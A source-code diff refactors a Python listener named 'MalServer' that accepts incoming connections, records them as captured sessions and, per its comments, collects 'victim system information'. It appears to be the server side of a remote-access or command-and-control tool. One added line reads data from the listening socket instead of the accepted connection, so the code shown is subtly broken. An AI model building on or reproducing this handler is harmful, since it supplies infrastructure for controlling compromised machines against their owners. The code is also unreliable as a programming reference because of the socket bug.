@@ -2,7 +2,7 @@ import threading
 import requests
 import socket
 import random
-import Client
+import Sessions
 
 def GetNetworkIP():
     try:
@@ -29,26 +29,40 @@ def GetPublicIP():
     else:
         return None
     
-def GetIP(ipType):
+def GetIP(ipType:str):
     if ipType == "local":
+        print("Getting LAN IP. . .")
         return GetNetworkIP()
     elif ipType == "public":
-        return GetNetworkIP()
+        print("Getting Public IP. . .")
+        return GetPublicIP()
     else:
+        print(f"[-] Unknown type: {ipType}")
         return ipType
 
-serverIsRunning = True
 class ServerConfig:
-    def __init__(self, lhost, lport):
-        self.lhost = str(lhost)
-        self.lport = int(lport)
+    def __init__(self, lhost:str, lport:int):
+        self.lhost = lhost
+        self.lport = lport
         self.capturedSessions = []
         self.sessionThreads = []
+        self.isActive = True
 
     def GetLhost(self):
         return self.lhost
     def GetLport(self):
         return self.lport
+
+    def Active(self):
+        return self.isActive
+    def ReadyShutdown(self):
+        print("[*] Sending Shutdown Signal. . .")
+        self.isActive = False
+        try:
+            killSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            killSocket.connect((self.lhost, self.lport))
+        except:
+            return None
     
     def GetSessions(self):
         return self.capturedSessions
@@ -69,13 +83,11 @@ class ServerConfig:
             t.join()
         print("[+] Sessions Closed Successfully!")
     
-def RunServer(ip):
+def RunServer(MalServer):
     try:
-        global serverIsRunning
         id = 0
 
-        # Set the configuration with an IP and random port
-        MalServer = ServerConfig(GetIP(ip.lower()),random.randint(1024,65535))
+        print(f"[*] Attempting to Bind to >> {MalServer.GetLhost()}:{MalServer.GetLport()}")
 
         serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         serversocket.bind((MalServer.GetLhost(), MalServer.GetLport()))
@@ -83,23 +95,19 @@ def RunServer(ip):
 
         print(f"[+] Server Active | {MalServer.GetLhost()}:{MalServer.GetLport()}")
 
-        while serverIsRunning:
+        while MalServer.Active():
             connection, address = serversocket.accept()
             # Upon connection if the server has been shutdown we skip all connection logic
             # concerning Clients
-            if serverIsRunning == False:
+            if MalServer.Active() == False:
                 break
 
+            # Server recieves victim system information
+            sessionData = serversocket.recv(1024).decode()
+
             # Store new Session Connection
-            clientSession = Client.Session(connection,address)
+            clientSession = Sessions.Session(connection,address,sessionData)
             MalServer.AddSession(clientSession)
-
-            # Track the new session object and thread
-            clientThread = threading.Thread(target=Client.SessionHandle, name=f"SessionThread_{id}", args=[clientSession])
-            id=id+1
-            clientThread.start()
-
-            # connection.sendall(str("Enter Username:").encode())
 
         # Shutdown the Socket Server
         MalServer.KillSessions()
